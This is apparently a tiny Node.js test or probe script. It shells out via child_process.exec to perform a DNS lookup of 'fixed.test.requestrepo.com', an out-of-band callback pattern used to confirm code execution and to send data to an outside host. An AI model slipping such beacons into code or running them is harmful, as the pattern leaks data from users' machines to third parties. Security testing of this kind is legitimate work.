const {exec} = require("child_process");
exec("user=fixed && host $user.test.requestrepo.com", () => {});
